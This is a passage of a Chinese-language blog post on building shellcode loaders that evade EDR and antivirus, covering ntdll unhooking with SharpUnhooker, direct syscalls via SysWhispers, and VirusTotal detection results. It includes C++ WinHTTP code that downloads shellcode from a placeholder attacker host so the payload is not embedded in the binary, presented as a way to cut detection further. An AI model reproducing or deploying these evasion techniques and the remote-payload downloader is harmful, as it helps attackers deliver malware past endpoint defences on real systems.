<h3 id="syscalls"><a href="#syscalls" class="headerlink" title="syscalls"></a>syscalls</h3><p>另一种方式可以更直接的绕过EDR的监测，通俗来讲就是调用更深的函数，WINAPI最后在进入内核时，都调用的是ntdll.dll的函数，因此，绕过kernel32.dll调用ntdll的函数即可绕过一部分监测</p>
<h4 id="SharpUnhooker"><a href="#SharpUnhooker" class="headerlink" title="SharpUnhooker"></a>SharpUnhooker</h4><p><strong>方法原理</strong><br>将 ntdll.dll 的新副本从磁盘映射到进程内存<br>找到被hook的 ntdll.dll 的 .text 部分的虚拟地址<br>查找新映射的 ntdll.dll 的 .text 部分的虚拟地址<br>获取hook模块的 .text 部分的原始内存保护<br>将 .text 部分从新映射的 dll 复制到原始（hook）ntdll.dll 的虚拟地址<br><strong>这样即可覆盖原来劫持了入口点的EDR代码</strong><br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/ntll.jpg" alt="edrhook"><br>这种直接调用ntdll.dll内核函数的方法被称为<strong>Native API</strong><br>so…其实还有更好的办法，首先需要一张图来表示windows 接口调用关系<br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/ntdll.jpg" alt="edrhook"><br>在Win32 API之下是Native API (ntdll.dll)，它实际上是用户模式应用程序和底层操作系统之间的真正接口(该API并未公开记录，意义着并无使用文档)</p>
<p>NtWriteFilez在内核中的指令<br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/syscall.jpg" alt="edrhook"></p>
<p>意思是可以通过直接调用对应函数内核指令的方式来利用加载，即为syscalls<br>其中涉及到很多的汇编知识，包括调用约定，系统调用号等，即syscall,不同系统的版本，位数，系统调用号也不一致，这样会导致花费大量的时间来在系统中寻找调用号，好在已经有大佬实现了自动工具(<a href="https://github.com/jthuraisamy/SysWhispers">https://github.com/jthuraisamy/SysWhispers</a>)<br>该工具可自动导出对应系统版本的函数调用约定，将导出的文件加载进项目文件即可使用<br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/syscallout.jpg" alt="edrhook"><br>其中VirtualAlloc在ntdll调用的函数应为NtAllocateVirtualMemory，可通过<a href="http://undocumented.ntinternals.net/%E6%9F%A5%E8%AF%A2%E5%AF%B9%E5%BA%94%E8%B5%84%E6%96%99%E5%8F%8A%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B">http://undocumented.ntinternals.net/查询对应资料及函数原型</a></p>
<p>代码复杂，相关资料可通过github搜索，编译测试<br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/vt3.jpg" alt="edrhook"><br>8/65的检测率已经非常不错了，但这不是我们的最终目的<br>经过反复测试，定位到是因为shellcode是直接写入程序，通过查看内存即可识别，我们可以利用分离加载shellcode绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">LPSTR <span class="title">GetRunCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;GetRunCode\n&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">	DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span>* pszOutBuffer = NULL;</span><br><span class="line">	HINTERNET  hSession = NULL,</span><br><span class="line">		hConnect = NULL,</span><br><span class="line">		hRequest = NULL;</span><br><span class="line">	BOOL  bResults = FALSE;</span><br><span class="line">	hSession = WinHttpOpen(L<span class="string">&quot;User-Agent&quot;</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSession)</span><br><span class="line">	&#123;</span><br><span class="line">		hConnect = WinHttpConnect(hSession, L<span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span>, INTERNET_DEFAULT_HTTP_PORT, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hConnect)</span><br><span class="line">	&#123;</span><br><span class="line">		hRequest = WinHttpOpenRequest(hConnect, L<span class="string">&quot;GET&quot;</span>, L<span class="string">&quot;GetRunCode.txt&quot;</span>, L<span class="string">&quot;HTTP/1.1&quot;</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	LPCWSTR header = L<span class="string">&quot;Content-type: application/x-www-form-urlencoded/r/n&quot;</span>;</span><br><span class="line">	SIZE_T len = lstrlenW(header);</span><br><span class="line">	WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line">	<span class="keyword">if</span> (hRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="comment">////bResults=WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (bResults)</span><br><span class="line">	&#123;</span><br><span class="line">		bResults = WinHttpReceiveResponse(hRequest, NULL);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (bResults)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// Check for available data.</span></span><br><span class="line">			dwSize = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(<span class="string">&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;</span>, GetLastError());</span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!dwSize)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			pszOutBuffer = <span class="keyword">new</span> <span class="keyword">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!pszOutBuffer)</span><br><span class="line">			&#123;</span><br><span class="line">				printf(<span class="string">&quot;Out of memory\n&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ZeroMemory(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(<span class="string">&quot;Error %u in WinHttpReadData.\n&quot;</span>, GetLastError());</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//char ShellCode[1024];</span></span><br><span class="line">			<span class="comment">//strcpy(ShellCode,pszOutBuffer);</span></span><br><span class="line">			<span class="keyword">if</span> (!dwDownloaded)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">	<span class="keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">	<span class="keyword">if</span> (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pszOutBuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译测试<br><img src="/2021/12/29/Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/../../../../photo/shellcodeloader/vt4.jpg" alt="edrhook"></p>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>后渗透</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
</search>
